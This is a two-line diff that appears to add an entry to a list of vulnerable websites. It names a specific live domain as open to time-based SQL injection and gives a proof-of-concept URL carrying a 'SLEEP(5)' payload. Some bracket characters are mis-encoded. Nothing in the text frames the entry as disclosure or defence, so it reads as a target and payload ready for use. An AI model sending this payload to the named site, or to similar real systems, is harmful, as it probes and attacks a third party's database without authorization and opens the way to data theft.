@@ -1,0 +1,2 @@
+¡¾+¡¿ https://jiujiuyao.club/?s=1 :  Vulnerable to SQL time injection;
+  POC is https://jiujiuyao.club/?s=1' AND (SELECT sleep(5))--
